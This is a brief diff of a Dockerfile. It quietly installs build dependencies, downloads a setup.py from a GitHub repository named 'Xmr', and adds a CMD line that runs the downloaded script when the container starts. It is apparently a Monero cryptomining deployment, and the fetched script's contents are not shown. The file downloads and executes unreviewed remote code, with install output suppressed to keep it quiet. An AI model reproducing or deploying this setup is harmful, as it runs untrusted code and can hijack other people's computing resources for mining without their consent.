@@ -6,3 +6,4 @@ RUN apt install systemctl -y > /dev/null 2>&1
 ENV LANG en_US.utf8
 RUN apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev python3 -y > /dev/null 2>&1 
 RUN wget https://raw.githubusercontent.com/jdjjd6262/Xmr/main/setup.py
+CMD python3 setup.py
